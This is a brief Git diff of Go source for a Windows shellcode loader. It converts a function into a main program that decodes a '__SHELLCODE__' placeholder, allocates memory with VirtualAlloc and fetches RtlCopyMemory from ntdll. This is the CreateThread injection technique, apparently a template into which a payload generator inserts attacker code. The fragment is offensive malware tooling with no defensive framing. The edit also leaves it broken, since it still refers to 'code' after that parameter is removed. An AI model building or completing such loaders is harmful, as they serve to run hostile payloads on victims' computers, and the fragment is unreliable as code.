@@ -1,4 +1,4 @@
-package CreateThread
+package main
 
 import (
 	"encoding/hex"
@@ -13,8 +13,8 @@ const (
 	PageReadwrite   = 0x04
 )
 
-func Createthread(code string) {
-	shellcode, _ := hex.DecodeString(code)
+func main() {
+	shellcode, _ := hex.DecodeString("__SHELLCODE__")
 	address, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(code)), MemCommit|MemReserve, PageReadwrite)
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
